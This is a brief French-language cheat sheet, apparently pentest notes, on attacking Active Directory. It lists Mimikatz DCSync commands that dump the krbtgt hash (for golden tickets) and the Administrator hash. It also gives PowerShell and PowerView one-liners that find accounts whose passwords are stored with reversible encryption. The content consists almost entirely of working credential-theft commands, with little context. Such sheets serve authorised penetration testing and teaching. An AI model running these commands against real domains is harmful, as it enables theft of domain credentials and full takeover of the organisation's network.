---
public: true # set to true to make the article publishable
---

## Mimikatz

```shell
# collecte du Hash de Krbtgt (pour golden ticket)
mimikatz > lsadump::dcsync /domain:DOMAIN /user:DOMAIN\krbtgt
# collecte du hash du compte Administrateur
mimikatz > lsadump::dcsync /domain:DOMAIN /user:DOMAIN\Administrateur
```

## Identification de comptes ayant leur mot de passe stocké en clair

### Module Active Directory

```shell
# ENCRYPTED_TEXT_PWD_ALLOWED = 128 (https://learn.microsoft.com/th-TH/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

### Powerview

```shell
. .\Powerview.ps1
 Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```
